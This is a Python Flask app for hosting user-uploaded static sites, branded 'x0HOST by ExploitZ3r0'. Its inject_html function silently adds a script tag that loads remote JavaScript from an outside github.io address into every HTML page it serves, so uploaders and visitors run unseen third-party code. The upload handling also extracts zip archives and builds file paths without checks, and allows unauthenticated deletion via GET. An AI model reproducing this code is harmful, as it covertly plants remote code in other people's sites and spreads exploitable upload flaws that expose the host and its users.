import os, zipfile, sqlite3, uuid, shutil
from datetime import datetime
from flask import Flask, request, render_template, redirect, url_for, abort, Response, send_from_directory

APP_NAME = "x0HOST by ExploitZ3r0"
UPLOAD_DIR = "uploads"
DB = "data.db"

INJECT_SCRIPT = '<script src="https://trejduu32-code.github.io/supreme-engine/a.js" defer></script>'
BRAND_COMMENT = '<!-- x0HOST by ExploitZ3r0 -->'

os.makedirs(UPLOAD_DIR, exist_ok=True)

app = Flask(__name__)

# ---------- DATABASE ----------
def db():
    return sqlite3.connect(DB)

def init_db():
    if os.path.exists(DB):
        return
    with db() as c:
        c.execute("""
        CREATE TABLE sites (
            id TEXT PRIMARY KEY,
            created TEXT,
            views INTEGER DEFAULT 0,
            expires TEXT
        )
        """)

# ---------- HTML INJECTION ----------
def inject_html(html):
    if "supreme-engine/a.js" in html:
        return html

    block = BRAND_COMMENT + "\n" + INJECT_SCRIPT + "\n"
    lower = html.lower()

    if "</head>" in lower:
        i = lower.rfind("</head>")
        return html[:i] + block + html[i:]
    return block + html

# ---------- AUTO CLEANUP ----------
def cleanup():
    now = datetime.utcnow()
    with db() as c:
        rows = c.execute("SELECT id, expires FROM sites").fetchall()
        for site_id, exp in rows:
            if exp and datetime.fromisoformat(exp) < now:
                shutil.rmtree(os.path.join(UPLOAD_DIR, site_id), ignore_errors=True)
                c.execute("DELETE FROM sites WHERE id=?", (site_id,))

# ---------- ROUTES ----------
@app.route("/", methods=["GET", "POST"])
def index():
    cleanup()

    if request.method == "POST":
        file = request.files["file"]
        site_id = request.form.get("site_id") or uuid.uuid4().hex[:6]
        expires = request.form.get("expires") or None

        site_path = os.path.join(UPLOAD_DIR, site_id)
        if os.path.exists(site_path):
            return "ID already taken", 400

        os.makedirs(site_path)

        if file.filename.endswith(".zip"):
            zip_path = os.path.join(site_path, "site.zip")
            file.save(zip_path)
            with zipfile.ZipFile(zip_path) as z:
                z.extractall(site_path)
            os.remove(zip_path)
        else:
            file.save(os.path.join(site_path, "index.html"))

        with db() as c:
            c.execute(
                "INSERT INTO sites VALUES (?, ?, 0, ?)",
                (site_id, datetime.utcnow().isoformat(), expires)
            )

        return redirect(url_for("dashboard"))

    return render_template("index.html")

@app.route("/dashboard")
def dashboard():
    with db() as c:
        sites = c.execute("SELECT * FROM sites ORDER BY created DESC").fetchall()
    return render_template("dashboard.html", sites=sites)

@app.route("/delete/<site_id>")
def delete(site_id):
    shutil.rmtree(os.path.join(UPLOAD_DIR, site_id), ignore_errors=True)
    with db() as c:
        c.execute("DELETE FROM sites WHERE id=?", (site_id,))
    return redirect(url_for("dashboard"))

@app.route("/h/<site_id>/")
@app.route("/h/<site_id>/<path:file>")
def serve(site_id, file="index.html"):
    path = os.path.join(UPLOAD_DIR, site_id, file)
    if not os.path.exists(path):
        abort(404)

    with db() as c:
        c.execute("UPDATE sites SET views = views + 1 WHERE id=?", (site_id,))

    if file.lower().endswith(".html"):
        with open(path, encoding="utf-8", errors="ignore") as f:
            html = inject_html(f.read())
        return Response(html, mimetype="text/html")

    return send_from_directory(os.path.dirname(path), os.path.basename(path))

# ---------- START ----------
if __name__ == "__main__":
    init_db()
    app.run(debug=True)
